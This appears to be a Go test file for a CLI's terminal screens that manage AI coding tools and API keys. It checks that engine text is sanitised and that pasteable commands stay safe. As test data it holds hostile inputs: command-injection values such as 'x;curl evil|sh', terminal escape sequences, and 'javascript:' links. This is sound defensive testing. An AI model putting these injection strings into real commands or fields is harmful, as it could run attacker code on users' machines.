// SPDX-FileCopyrightText: 2026 Olivares.AI
// SPDX-License-Identifier: AGPL-3.0-only
// Additional terms under AGPL-3.0-only section 7(a) disclaim warranty and limit liability: see DISCLAIMER.md at the repository root.

package main

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/olivaresai/olivares/cmd/olivares/internal/tui"
)

func boolPtr(b bool) *bool { return &b }

func rowByLabel(t *testing.T, frame tui.Frame, label string) tui.MenuItem {
	t.Helper()
	for _, item := range frame.Items {
		if item.Label == label {
			return item
		}
	}
	t.Fatalf("no row %q in %+v", label, frame.Items)
	return tui.MenuItem{}
}

func TestToolsFrameShowsEachToolsStateAndAction(t *testing.T) {
	d := uiToolsData{
		rows: []toolRow{
			{Driver: "claude", Installed: true, Version: "2.1.286", SignedIn: boolPtr(true), Account: "rehema@acme.example"},
			{Driver: "codex", Installed: true, Version: "0.159.3", SignedIn: boolPtr(false)},
			{Driver: "grok"},
			{Driver: "opencode", Installed: true},
			{Driver: "ollama", Installed: true},
		},
		running: map[string]int{"claude": 2},
	}
	frame, _ := (&uiTools{}).toolsFrame(d, "AI tools", false, nil)
	for _, tc := range []struct {
		label, detail, command string
		hasOpener              bool
	}{
		{"Claude Code", "Signed in · rehema@acme.example · 2 sessions running", "olivares tool ls", false},
		{"Codex", "Installed · not signed in", "olivares tool login codex", true},
		{"Grok Build", "Not installed", "olivares tool install grok", true},
		{"OpenCode", "Installed · sign-in not readable  [ Sign in ]", "olivares tool login opencode", true},
		{"Ollama", "Installed", "olivares tool ls", false},
	} {
		item := rowByLabel(t, frame, tc.label)
		if !strings.Contains(item.Detail, tc.detail) {
			t.Errorf("%s detail = %q, want it to hold %q", tc.label, item.Detail, tc.detail)
		}
		if item.Command != tc.command {
			t.Errorf("%s command = %q, want %q", tc.label, item.Command, tc.command)
		}
		if (item.Open != nil) != tc.hasOpener {
			t.Errorf("%s has opener %v, want %v", tc.label, item.Open != nil, tc.hasOpener)
		}
	}
	if got := rowByLabel(t, frame, "Codex").Detail; !strings.Contains(got, "[ Sign in ]") {
		t.Errorf("Codex detail = %q, want the action in words", got)
	}
	if got := rowByLabel(t, frame, "Grok Build").Detail; !strings.Contains(got, "[ Install ]") {
		t.Errorf("Grok Build detail = %q, want the action in words", got)
	}
}

func TestToolsFrameListsAccountsAndKeysInTheSameList(t *testing.T) {
	d := uiToolsData{
		rows: []toolRow{{Driver: "claude", Installed: true, SignedIn: boolPtr(true)}},
		providers: []map[string]any{
			{"provider_ref": "prv_01", "display_name": "anthropic-team", "kind": "anthropic", "key_hint": "…wxyz", "state": "active", "probe_state": "ok"},
			{"provider_ref": "prv_02", "display_name": "OpenAI", "kind": "openai", "key_hint": "…abcd", "state": "active", "probe_state": "refused"},
		},
		accounts: []map[string]any{
			{"account_ref": "ppf_01", "name": "claude-a", "driver": "claude", "state": "active"},
		},
	}
	frame, _ := (&uiTools{}).toolsFrame(d, "AI tools", false, nil)
	team := rowByLabel(t, frame, "anthropic-team")
	for _, want := range []string{"API key", "Anthropic", "…wxyz", "works"} {
		if !strings.Contains(team.Detail, want) {
			t.Errorf("key row detail = %q, want %q", team.Detail, want)
		}
	}
	if team.Command != "olivares provider get prv_01" {
		t.Errorf("key row command = %q", team.Command)
	}
	if got := rowByLabel(t, frame, "OpenAI").Detail; !strings.Contains(got, "refused") {
		t.Errorf("a refused key reads %q; the word, not a color, must say so", got)
	}
	account := rowByLabel(t, frame, "claude-a")
	if !strings.Contains(account.Detail, "Account") || !strings.Contains(account.Detail, "Claude Code") {
		t.Errorf("account row detail = %q", account.Detail)
	}
	last := frame.Items[len(frame.Items)-1]
	if last.Label != "Add an API key" || last.Open == nil || last.Command != "olivares provider add" {
		t.Errorf("the last row is %+v, want the way to add a key", last)
	}
}

func TestToolsFrameCommandsAreRealCommands(t *testing.T) {
	root := newRootCmd()
	d := uiToolsData{
		rows: []toolRow{
			{Driver: "claude"},
			{Driver: "codex", Installed: true, SignedIn: boolPtr(false)},
			{Driver: "opencode", Installed: true, SignedIn: boolPtr(true)},
		},
		providers: []map[string]any{{"provider_ref": "prv_01", "display_name": "k", "kind": "openai", "state": "active"}},
		accounts:  []map[string]any{{"account_ref": "ppf_01", "name": "claude-a", "driver": "claude", "state": "active"}},
	}
	frame, _ := (&uiTools{}).toolsFrame(d, "AI tools", false, nil)
	for _, item := range frame.Items {
		if err := commandResolves(root, item.Command); err != nil {
			t.Errorf("row %q names %q, which is no command: %v", item.Label, item.Command, err)
		}
	}
}

// Get started names the step the main menu and `olivares` name for the same
// engine state: with nothing ready, the first installed tool's sign-in, else
// installing Claude Code.
func TestGetStartedCountsTheStepsAndPutsTheCursorOnTheNextOne(t *testing.T) {
	for _, tc := range []struct {
		name       string
		data       uiToolsData
		wantFooter string
		wantRow    string
	}{
		{"nothing installed",
			uiToolsData{rows: []toolRow{{Driver: "claude"}, {Driver: "codex"}}},
			"1 of 3 done. Next: olivares tool install claude", "Claude Code"},
		{"installed, not signed in",
			uiToolsData{rows: []toolRow{{Driver: "claude", Installed: true, SignedIn: boolPtr(false)}, {Driver: "codex"}}},
			"2 of 3 done. Next: olivares tool login claude", "Claude Code"},
		{"an installed Codex is a shorter path than installing Claude Code",
			uiToolsData{rows: []toolRow{{Driver: "claude"}, {Driver: "codex", Installed: true, SignedIn: boolPtr(false)}}},
			"2 of 3 done. Next: olivares tool login codex", "Codex"},
		{"a signed-in Codex is a working path without Claude Code",
			uiToolsData{rows: []toolRow{{Driver: "claude"}, {Driver: "codex", Installed: true, SignedIn: boolPtr(true)}}, ready: true},
			"3 of 3 done. Next: olivares session start <folder>", "Claude Code"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			frame, cursor := (&uiTools{}).toolsFrame(tc.data, "Get started", true, nil)
			if frame.Heading != "Get started" || !strings.Contains(frame.Footer, tc.wantFooter) {
				t.Fatalf("heading %q footer %q, want %q", frame.Heading, frame.Footer, tc.wantFooter)
			}
			if !tc.data.ready {
				if got := frame.Items[cursor].Label; got != tc.wantRow {
					t.Fatalf("the cursor is on %q, want %q", got, tc.wantRow)
				}
				if want := "Next: " + rootNextFromTools(tc.data.rows); !strings.Contains(frame.Footer, want) {
					t.Errorf("footer %q differs from the main menu's %q", frame.Footer, want)
				}
			}
		})
	}
}

// A request a screen makes to install runs as long as the command's does: the
// engine takes up to 45 seconds to resolve and verify a release.
func TestInstallWaitsForThePlanAsLongAsTheCommandDoes(t *testing.T) {
	e := newUIEngine(t)
	e.planDelay = 400 * time.Millisecond
	u := uiToolsOn(t, e)
	u.cfg.timeout = 100 * time.Millisecond // a request limit shorter than the plan takes
	cfg := u.installClient()
	if cfg.timeout != toolInstallTimeout {
		t.Fatalf("an install request may take %s, want the command's %s", cfg.timeout, toolInstallTimeout)
	}
	cfg.timeout = 5 * time.Second // the same path, with a bound a test can wait for
	_, job, err := cfg.installTool(context.Background(), map[string]any{"driver": "claude", "version": "latest"}, func(toolInstallPlan) {})
	if err != nil || job.State != "succeeded" {
		t.Fatalf("install = %+v, %v; want it to succeed after a slow plan", job, err)
	}
}

// A name, hint or message from the engine reaches a terminal: an escape sequence
// or a newline in one must not draw anything or break a row.
func TestToolsFrameStripsControlBytesFromEngineText(t *testing.T) {
	d := uiToolsData{
		rows: []toolRow{{Driver: "claude", Installed: true, SignedIn: boolPtr(true), Account: "a\x1b[2Jb@example.com\nx"}},
		providers: []map[string]any{
			{"provider_ref": "prv_01", "display_name": "evil\x1b]0;title\x07name\n", "kind": "openai", "key_hint": "\x1b[31m…1234", "state": "active"},
		},
		accounts: []map[string]any{{"account_ref": "ppf_01", "name": "n\x1b[Hame", "driver": "claude", "state": "active"}},
		warn:     "could not read \x1b[2Jthe keys",
	}
	frame, _ := (&uiTools{}).toolsFrame(d, "AI tools", false, nil)
	cells := []string{frame.Heading, frame.Right, frame.Footer}
	for _, item := range frame.Items {
		cells = append(cells, item.Label, item.Detail, item.Command)
	}
	for _, cell := range cells {
		if strings.ContainsAny(cell, "\x1b\x07\n\t") {
			t.Errorf("a cell carries a control byte or breaks its row: %q", cell)
		}
	}
}

func TestProviderChoiceMapsToItsKind(t *testing.T) {
	for label, kind := range map[string]string{"Anthropic": "anthropic", "OpenAI": "openai", "xAI": "xai", "Gemini": "gemini"} {
		if got := keyKinds[label]; got != kind {
			t.Errorf("choice %q = kind %q, want %q", label, got, kind)
		}
	}
	for _, label := range keyKindLabels {
		if _, ok := keyKinds[label]; !ok {
			t.Errorf("choice %q has no kind", label)
		}
	}
}

func TestSignInLinesSaysWhatEachToolNeeds(t *testing.T) {
	for _, tc := range []struct {
		name      string
		driver    string
		s         toolSignIn
		want      []string
		notWant   []string
		needsCode bool
	}{
		{"starting", "codex", toolSignIn{State: "starting"}, []string{"Starting the Codex sign-in"}, []string{"Open this link"}, false},
		{"a device code is shown to enter on the page", "codex",
			toolSignIn{State: "waiting", URL: "https://auth.example/device", UserCode: "ABCD-1234"},
			[]string{"https://auth.example/device", "Enter this code there:", "ABCD-1234"}, nil, false},
		{"Claude Code takes the page's code, so it is not given one", "claude",
			toolSignIn{State: "needs_code", URL: "https://claude.example/authorize", UserCode: "NOT-SHOWN"},
			[]string{"https://claude.example/authorize"}, []string{"NOT-SHOWN", "Enter this code there"}, true},
		{"a login that waits for a key says where the key is made and asks for it", "opencode",
			toolSignIn{State: "needs_key", URL: "https://opencode.ai/auth", UserCode: "NOT-SHOWN"},
			[]string{"Create an API key here", "https://opencode.ai/auth"}, []string{"NOT-SHOWN", "Enter this code there"}, true},
		{"a failed login draws no link and no code", "codex",
			toolSignIn{State: "failed", URL: "https://auth.example/device", UserCode: "ABCD-1234", Message: "Expired."},
			[]string{"Finishing"}, []string{"https://auth.example/device", "ABCD-1234", "Open this link"}, false},
		{"a finished login draws no link and no code", "codex",
			toolSignIn{State: "signed_in", URL: "https://auth.example/device", UserCode: "ABCD-1234"},
			[]string{"Finishing"}, []string{"https://auth.example/device", "ABCD-1234", "Open this link"}, false},
		{"a login that waits for a key with no link still asks for it", "opencode",
			toolSignIn{State: "needs_key"},
			[]string{"Paste the API key"}, []string{"Open this link", "Starting"}, true},
		{"a failed login with no link is not called starting", "codex",
			toolSignIn{State: "failed", Message: "Expired."},
			[]string{"Finishing"}, []string{"Starting"}, false},
		{"a refused code is explained and asked again", "gemini-cli",
			toolSignIn{State: "needs_code", URL: "https://g.example/auth", Message: "That code was not accepted.\x1b[2J"},
			[]string{"That code was not accepted."}, []string{"\x1b"}, true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			lines, footer, needsCode := signInLines(tc.driver, tc.s)
			text := strings.Join(lines, "\n")
			for _, want := range tc.want {
				if !strings.Contains(text, want) {
					t.Errorf("the page lacks %q:\n%s", want, text)
				}
			}
			for _, not := range tc.notWant {
				if strings.Contains(text+footer, not) {
					t.Errorf("the page holds %q:\n%s", not, text)
				}
			}
			if needsCode != tc.needsCode {
				t.Errorf("needsCode = %v, want %v", needsCode, tc.needsCode)
			}
		})
	}
}

// A connection test is said in words: none of the four may read like another.
func TestConnectionWordsAreDistinct(t *testing.T) {
	seen := map[string]string{}
	for _, probe := range []string{"ok", "refused", "unreachable", ""} {
		words := connectionWords(probe)
		if other, dup := seen[words]; dup {
			t.Errorf("probe %q and %q both read %q", probe, other, words)
		}
		seen[words] = probe
	}
}

// uiToolsOn is the screens' client, pointed at the fake engine the way a command's
// flags would point it.
func uiToolsOn(t *testing.T, e *uiEngine) *uiTools {
	t.Helper()
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	u := &uiTools{cfg: agentClientConfig{server: e.URL, token: uiTestToken, tenant: uiTestTenant, timeout: uiRequestTimeout}}
	if err := u.cfg.resolve(); err != nil {
		t.Fatalf("resolve the client: %v", err)
	}
	return u
}

// A driver id is the engine's text and names a command: one that would draw on a
// terminal is not shown, and the tools around it are.
func TestReadSkipsADriverIdThatWouldDrawOnATerminal(t *testing.T) {
	e := newUIEngine(t)
	e.extraDrivers = []string{"evil\x1b]52;c;ZXZpbA==\x07"}
	d, err := uiToolsOn(t, e).read(context.Background())
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if len(d.rows) != 5 {
		t.Fatalf("read %d tools, want the five real ones: %+v", len(d.rows), d.rows)
	}
	for _, row := range d.rows {
		if strings.ContainsAny(row.Driver, "\x1b\x07") {
			t.Errorf("driver %q reached the screen", row.Driver)
		}
	}
}

func TestReadCountsRunningSessionsPerTool(t *testing.T) {
	e := newUIEngine(t)
	e.runs = []map[string]any{
		{"run_ref": "run_1", "state": "running", "provider_driver": "codex"},
		{"run_ref": "run_2", "state": "running", "provider_driver": "codex"},
		{"run_ref": "run_3", "state": "running"},
		{"run_ref": "run_4", "state": "stopped", "provider_driver": "codex"},
	}
	d, err := uiToolsOn(t, e).read(context.Background())
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if d.running["codex"] != 2 || d.running["claude"] != 1 {
		t.Errorf("running = %v, want 2 for codex and 1 for claude (the default tool); stopped ones do not count", d.running)
	}
}

// What cannot be read is named, never shown as an empty list.
func TestReadNamesWhatItCouldNotRead(t *testing.T) {
	e := newUIEngine(t)
	e.providersDown = true
	d, err := uiToolsOn(t, e).read(context.Background())
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !strings.Contains(d.warn, "the API keys") || strings.Contains(d.warn, "accounts") {
		t.Errorf("warn = %q, want it to name the API keys and only them", d.warn)
	}
	frame, _ := (&uiTools{}).toolsFrame(d, "AI tools", false, nil)
	if !strings.Contains(frame.Footer, "Could not read the API keys") {
		t.Errorf("the footer is %q; the screen must say the keys were not read", frame.Footer)
	}
}

func TestReadFailsWhenTheToolsCannotBeRead(t *testing.T) {
	e := newUIEngine(t)
	e.inventoryDown = true
	if _, err := uiToolsOn(t, e).read(context.Background()); err == nil {
		t.Fatal("read succeeded without the tool inventory")
	}
}

// With no tool ready and a key its provider refused, the footer says why, as
// `olivares` does, instead of naming a step for another tool.
// Only an answer that says the engine did not take the key says it was not added.
// A server error may have come after the key was sealed.
func TestKeyNotAddedSaysWhatIsKnown(t *testing.T) {
	body := []byte(`{"error":{"code":"x","message":"The engine said no."}}`)
	for _, tc := range []struct {
		name string
		err  error
		want string
	}{
		{"refused", httpErr(400, body), "The key was not added: "},
		{"server error", httpErr(502, body), "The key may not have been added: "},
		{"no answer", context.DeadlineExceeded, "The key may not have been added: "},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := keyNotAdded(tc.err); !strings.HasPrefix(got, tc.want) {
				t.Errorf("keyNotAdded = %q, want it to start %q", got, tc.want)
			}
		})
	}
}

func TestGetStartedNamesARefusedKey(t *testing.T) {
	d := uiToolsData{
		rows:    []toolRow{{Driver: "codex", Installed: true, SignedIn: boolPtr(true)}},
		refused: "Codex would run on the API key Old OpenAI, which its provider refused at the last test.",
	}
	frame, _ := (&uiTools{}).toolsFrame(d, "Get started", true, nil)
	if frame.Footer != d.refused {
		t.Errorf("the footer is %q, want the engine's sentence", frame.Footer)
	}
}

// Text from the engine can reorder what a person reads: a right-to-left override
// in a name or hint must not reach the terminal.
func TestToolsFrameStripsBidiControlsFromEngineText(t *testing.T) {
	d := uiToolsData{
		rows:      []toolRow{{Driver: "claude", Installed: true, SignedIn: boolPtr(true), Account: "ana\u202e@example.com"}},
		providers: []map[string]any{{"provider_ref": "prv_01", "display_name": "k\u2066ey\u200f", "kind": "openai", "key_hint": "…12\u202e34", "state": "active"}},
	}
	frame, _ := (&uiTools{}).toolsFrame(d, "AI tools", false, nil)
	for _, item := range frame.Items {
		for _, text := range []string{item.Label, item.Detail, item.Command} {
			if strings.ContainsAny(text, "\u202e\u2066\u200f") {
				t.Errorf("row %q reaches the terminal with a bidi control: %q", item.Label, text)
			}
		}
	}
}

// A driver id and a provider reference are printed into commands a person may
// paste: one that is not a plain name is not shown as part of a command.
func TestReadSkipsADriverIdThatIsNotAPlainName(t *testing.T) {
	e := newUIEngine(t)
	e.extraDrivers = []string{"x;curl evil|sh", "a b"}
	d, err := uiToolsOn(t, e).read(context.Background())
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if len(d.rows) != 5 {
		t.Fatalf("read %d tools, want the five real ones: %+v", len(d.rows), d.rows)
	}
	if !strings.Contains(d.warn, "a tool with an unusual name") {
		t.Errorf("warn = %q, want it to say a tool was left out", d.warn)
	}
}

func TestKeyRowNamesNoCommandForARefThatIsNotAPlainName(t *testing.T) {
	item := keyItem(map[string]any{"provider_ref": "prv_01; wipe", "display_name": "k", "kind": "openai"})
	if item.Command != "olivares provider ls" {
		t.Errorf("command = %q, want the list command for an odd reference", item.Command)
	}
	if item := keyItem(map[string]any{"provider_ref": "prv_01", "display_name": "k", "kind": "openai"}); item.Command != "olivares provider get prv_01" {
		t.Errorf("command = %q, want the command for a plain reference", item.Command)
	}
}

// A readiness that cannot be read is said so, not shown as "nothing is ready".
func TestReadNamesAReadinessItCouldNotRead(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["claude"] = true; e.signedIn["claude"] = true; e.readinessDown = true })
	d, err := uiToolsOn(t, e).read(context.Background())
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !strings.Contains(d.warn, "whether a tool is ready") {
		t.Errorf("warn = %q, want it to say the readiness was not read", d.warn)
	}
}

// The link a person opens to sign in is the engine's text: only a plain https
// address is shown.
func TestSafeLinkIsAPlainHTTPSAddress(t *testing.T) {
	for link, want := range map[string]bool{
		uiClaudeLink:                       true,
		"https://auth.openai.com/codex":    true,
		"http://auth.example.com/login":    false,
		"javascript:alert(1)":              false,
		"https://user:pw@auth.example.com": false,
		"https://auth.example.com/a b":     false,
		"https://auth.exämple.com/":        false,
		"https:///path":                    false,
		"":                                 false,
		// An address the terminal cannot show whole, and a host a browser reads
		// differently from the text a person sees.
		"https://" + strings.Repeat("a", 2100) + ".example.com/": false,
		"https://%c3%a9xample.com/":                              false,
		// Longer than the page can show beside its other lines at 80 x 24: half a
		// link on the screen is a link nobody can use.
		"https://auth.example.com/" + strings.Repeat("a", 900): false,
	} {
		if got := safeLink(link); got != want {
			t.Errorf("safeLink(%q) = %v, want %v", link, got, want)
		}
	}
}

// The command says why an install job failed, in the engine's words, and exits
// with an error: the screen's text is the same sentence.
func TestToolInstallNamesWhyTheJobFailed(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.jobFails = true })
	_, errb, err := execSessionCLI(t, strings.NewReader(""), append([]string{"tool", "install", "claude"}, sessionCreds(e.URL)...)...)
	if err == nil {
		t.Fatal("the install of a failed job exited 0")
	}
	if got := err.Error() + errb; !strings.Contains(got, "Claude Code was not installed: No space left on the device.") {
		t.Errorf("the command said %q, want the engine's reason", got)
	}
}

// When the engine cannot be read again, the screen keeps the sentence the action
// already had: "Installed" is true whether or not the list could be re-read.
func TestReadFailedFrameKeepsWhatTheScreenAlreadyKnew(t *testing.T) {
	frame := readFailedFrame("AI tools", "Installed Claude Code 2.1.286.", errors.New("the engine is down"))
	for _, want := range []string{"Installed Claude Code 2.1.286.", "the engine is down"} {
		if !strings.Contains(frame.Footer, want) {
			t.Errorf("footer %q lacks %q", frame.Footer, want)
		}
	}
	if got := readFailedFrame("AI tools", "", errors.New("the engine is down")).Footer; strings.HasPrefix(got, " ") {
		t.Errorf("footer %q starts with a space", got)
	}
}

// A link is judged where it is drawn. A login that already finished has nothing to
// show, so a stale address in its answer is not a failure.
func TestSignInLinkIsOnlyJudgedWhereItIsShown(t *testing.T) {
	for _, tc := range []struct {
		name string
		s    toolSignIn
		want bool
	}{
		{"a plain https link", toolSignIn{State: "waiting", URL: uiClaudeLink}, false},
		{"a link that is not https", toolSignIn{State: "waiting", URL: "http://x.example/a"}, true},
		{"a code asked for at an odd link", toolSignIn{State: "needs_code", URL: "javascript:alert(1)"}, true},
		{"no link yet", toolSignIn{State: "starting"}, false},
		{"signed in, with a stale odd link", toolSignIn{State: "signed_in", URL: "http://x.example/a"}, false},
	} {
		if got := linkRefused(tc.s); got != tc.want {
			t.Errorf("%s: linkRefused = %v, want %v", tc.name, got, tc.want)
		}
	}
}

// A row is what a person reads: characters that draw nothing, or reorder what is
// around them, make one name look like another.
func TestOneRowDropsWhatAReaderCannotSee(t *testing.T) {
	for _, tc := range []struct{ name, in, want string }{
		{"zero-width and format characters", "a\u200bb\u2060c\ufeffd\u00ade", "abcde"},
		{"line and paragraph separators", "a\u2028b\u2029c", "abc"},
		{"joiners that spell a name stay", "a\u200cb\u200dc", "a\u200cb\u200dc"},
		{"an invalid byte", "x\x9by", "xy"},
		{"newline and tab become spaces", "a\nb\tc", "a b c"},
	} {
		if got := oneRow(tc.in); got != tc.want {
			t.Errorf("%s: oneRow(%q) = %q, want %q", tc.name, tc.in, got, tc.want)
		}
	}
}

// The page after a key was added says what the connection test found and the
// command that fixes it; a reference that is not a plain name is not in a command.
func TestKeyResultSaysWhatToDoForEachTestResult(t *testing.T) {
	for _, tc := range []struct {
		name, ref, probe string
		want, never      []string
	}{
		{"refused", "prv_01", "refused",
			[]string{"Connection test: refused by the provider.", "olivares provider rotate prv_01 < new-key.txt"}, []string{"provider test"}},
		{"unreachable", "prv_01", "unreachable",
			[]string{"Connection test: provider not reachable.", "olivares provider test prv_01"}, []string{"rotate"}},
		{"not tested", "prv_01", "",
			[]string{"Connection test: not tested.", "olivares provider test prv_01"}, []string{"rotate"}},
		{"works", "prv_01", "ok",
			[]string{"Connection test: works."}, []string{"olivares provider"}},
		{"a refused key with an odd reference", "prv_01; curl evil|sh", "refused",
			[]string{"olivares provider ls"}, []string{"curl", "rotate"}},
		{"an untested key with an odd reference", "prv_01; curl evil|sh", "",
			[]string{"olivares provider ls"}, []string{"curl", "provider test"}},
	} {
		p := &tui.Panel{}
		showKeyResult(p, map[string]any{"provider_ref": tc.ref, "key_hint": "…wxyz", "probe_state": tc.probe}, "Work")
		text := strings.Join(p.Lines, "\n")
		for _, want := range tc.want {
			if !strings.Contains(text, want) {
				t.Errorf("%s: the page lacks %q:\n%s", tc.name, want, text)
			}
		}
		for _, never := range tc.never {
			if strings.Contains(text, never) {
				t.Errorf("%s: the page holds %q:\n%s", tc.name, never, text)
			}
		}
	}
}

// Ending a sign-in is one request. A second caller (the loop on a quit, while the
// flow's own goroutine is ending it) waits for that request and gets its answer,
// so the process does not exit with the end still on its way.
func TestEndingASignInIsOneRequestEveryCallerWaitsFor(t *testing.T) {
	for _, refuses := range []bool{false, true} {
		t.Run(fmt.Sprintf("engine refuses the end: %v", refuses), func(t *testing.T) {
			e := newUIEngine(t)
			e.set(func() { e.deleteFails = refuses })
			gate := e.hold("DELETE", agentToolsPath+"/sign-in/s2")
			t.Cleanup(gate.open)
			u := uiToolsOn(t, e)
			f := &signInFlow{cfg: &u.cfg, id: "s2"}
			results := make(chan bool, 2)
			go func() { results <- f.endOnEngine() }()
			select {
			case <-gate.arrived:
			case <-time.After(5 * time.Second):
				t.Fatal("the engine never saw the end of the sign-in")
			}
			go func() { results <- f.endOnEngine() }()
			select {
			case <-results:
				t.Fatal("a caller returned before the engine answered the end")
			case <-time.After(300 * time.Millisecond):
			}
			gate.open()
			for range 2 {
				select {
				case ended := <-results:
					if ended == refuses {
						t.Errorf("a caller was told ended=%v, the engine refusing is %v", ended, refuses)
					}
				case <-time.After(5 * time.Second):
					t.Fatal("a caller never returned after the engine answered")
				}
			}
			deletes := 0
			for _, w := range e.ledger() {
				if strings.HasPrefix(w, "DELETE ") {
					deletes++
				}
			}
			if deletes != 1 {
				t.Errorf("the engine saw %d requests to end the sign-in, want one", deletes)
			}
		})
	}
}

// Only an answer in the 400s is a refusal: the engine read the request and did
// not act on it. A 2xx that is not the one expected, or a 5xx, leaves it unknown.
func TestEngineRefusedMeansAFourHundredStatus(t *testing.T) {
	for status, want := range map[int]bool{
		http.StatusBadRequest:          true,
		http.StatusForbidden:           true,
		http.StatusNotFound:            true,
		http.StatusConflict:            true,
		http.StatusOK:                  false,
		http.StatusAccepted:            false,
		http.StatusInternalServerError: false,
		http.StatusBadGateway:          false,
	} {
		if got := engineRefused(httpErr(status, []byte(`{}`))); got != want {
			t.Errorf("engineRefused(HTTP %d) = %v, want %v", status, got, want)
		}
	}
	if engineRefused(errors.New("context deadline exceeded")) {
		t.Error("a request that timed out was taken for a refusal")
	}
}

// The tool routes word a 403 and a 404 as a sentence of their own (toolHTTPErr),
// not as the engine's refusal: a person who may not sign a tool in, or an engine
// older than the CLI, was told a sign-in "may have started" that never did.
func TestEngineRefusedKnowsHowTheToolRoutesWordARefusal(t *testing.T) {
	forbidden := []byte(`{"error":{"code":"forbidden","message":"Only an administrator may do this."}}`)
	for name, tc := range map[string]struct {
		err  error
		want bool
	}{
		"404 from a tool route":         {toolHTTPErr(http.StatusNotFound, []byte(`{}`)), true},
		"403 with a message":            {toolHTTPErr(http.StatusForbidden, forbidden), true},
		"403 without a message":         {toolHTTPErr(http.StatusForbidden, []byte(`{}`)), true},
		"400 from a tool route":         {toolHTTPErr(http.StatusBadRequest, []byte(`{}`)), true},
		"500 from a tool route":         {toolHTTPErr(http.StatusInternalServerError, []byte(`{}`)), false},
		"a wait that ended":             {context.DeadlineExceeded, false},
		"an answer that cannot be read": {errors.New("invalid character '<' looking for beginning of value"), false},
	} {
		if got := engineRefused(tc.err); got != tc.want {
			t.Errorf("%s: engineRefused = %v, want %v", name, got, tc.want)
		}
	}
}

// Work in flight when the person quits is said by the command; work that answered
// is not.
func TestPendingNotesAreSaidOnlyWhileTheWorkHasNotAnswered(t *testing.T) {
	u := &uiTools{}
	u.note("kept for good")
	stillOpen := u.pending("still open")
	answered := u.pending("answered")
	answered()
	var out strings.Builder
	u.sayKept(&out)
	if got := out.String(); got != "kept for good\nstill open\n" {
		t.Errorf("said %q, want the kept note and the work still open", got)
	}
	stillOpen()
	out.Reset()
	u.sayKept(&out)
	if got := out.String(); got != "kept for good\n" {
		t.Errorf("said %q after the last answer, want only the kept note", got)
	}
}

// The answer to one request does not drop the note of another that has the same
// words and is still on its way: a key sent, left, and sent again.
func TestAnAnswerDropsOnlyItsOwnPendingNote(t *testing.T) {
	u := &uiTools{}
	first := u.pending("A key sent as you left may have been added.")
	u.pending("A key sent as you left may have been added.") // the second request
	first()
	var out strings.Builder
	u.sayKept(&out)
	if got := out.String(); got != "A key sent as you left may have been added.\n" {
		t.Errorf("said %q after the first answer, want the note of the request still on its way, once", got)
	}
}

// A key is for the provider its prefix names: sk-ant-, sk-, xai- and AIza (Gemini).
func TestKeyForAnotherProviderNamesBoth(t *testing.T) {
	for _, tc := range []struct{ kind, key, want string }{
		{"anthropic", "sk-ant-api03-abc", ""},
		{"openai", "sk-proj-abc", ""},
		{"xai", "xai-abc", ""},
		{"gemini", "AIzaSyabc", ""},
		{"openai", "sk-ant-api03-abc", "That key is for Anthropic, not OpenAI. Go up to Provider and change it."},
		{"anthropic", "sk-proj-abc", "That key is for OpenAI, not Anthropic. Go up to Provider and change it."},
		{"gemini", "xai-abc", "That key is for xAI, not Gemini. Go up to Provider and change it."},
		// A Gemini key has a prefix of its own, so one left under another provider
		// is not sent to that provider's endpoint.
		{"anthropic", "AIzaSyabc", "That key is for Gemini, not Anthropic. Go up to Provider and change it."},
		{"openai", "AIzaSyabc", "That key is for Gemini, not OpenAI. Go up to Provider and change it."},
		{"xai", "AIzaSyabc", "That key is for Gemini, not xAI. Go up to Provider and change it."},
	} {
		if got := keyForAnotherProvider(tc.kind, tc.key); got != tc.want {
			t.Errorf("keyForAnotherProvider(%q, %q) = %q, want %q", tc.kind, tc.key, got, tc.want)
		}
	}
}

// A tool with its own sign-in whose state the engine could not read is not shown
// as a healthy "Installed": the screen says so, offers the sign-in and the
// footer's warning names it.
func TestReadNamesASignInStateItCouldNotRead(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["claude"] = true; e.signedIn["claude"] = true; e.signInStatusDown = true })
	d, err := uiToolsOn(t, e).read(context.Background())
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !strings.Contains(d.warn, "whether a tool is signed in") {
		t.Errorf("warn = %q, want it to say the sign-in state was not read", d.warn)
	}
	frame, _ := (&uiTools{}).toolsFrame(d, "AI tools", false, nil)
	if got := rowByLabel(t, frame, "Claude Code"); !strings.Contains(got.Detail, "sign-in not readable") || got.Open == nil {
		t.Errorf("Claude Code row = %q (opener %v), want the unreadable sign-in said with the action kept", got.Detail, got.Open != nil)
	}
}

// Rows open a screen only for an engine that is reachable and a person signed in
// to it: with either missing the screens would only answer 401 or a refusal, so
// the row keeps showing its command.
func TestWireToolScreensNeedsAnEngineAndASignIn(t *testing.T) {
	for name, report := range map[string]rootStatusReport{
		"engine down":   {Reachable: false, SignedIn: "Rehema"},
		"not signed in": {Reachable: true},
		"both missing":  {},
	} {
		frame := tui.Frame{Items: []tui.MenuItem{{Label: "Get started"}, {Label: "AI tools"}}}
		if wireToolScreens(&frame, report) != nil {
			t.Errorf("%s: screens were wired", name)
		}
		for _, item := range frame.Items {
			if item.Open != nil {
				t.Errorf("%s: %q opens a screen", name, item.Label)
			}
		}
	}
}

// The link is the one address a sign-in page carries. The code and the message
// beside it are the engine's text too, so one that names another address, or a
// code that is not a code, is refused like a link that is not plain https.
func TestSignInTextBesideTheLinkNamesNoOtherAddress(t *testing.T) {
	for name, tc := range map[string]struct {
		in   toolSignIn
		want bool
	}{
		"plain code and message":   {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "That code was not accepted. Paste the newest code from the sign-in page."}, false},
		"device code":              {toolSignIn{State: "waiting", URL: "https://auth.openai.com/codex/device", UserCode: "ABCD-1234"}, false},
		"message with a link":      {toolSignIn{State: "needs_code", URL: uiClaudeLink, Message: "Open https://evil.example/x instead."}, true},
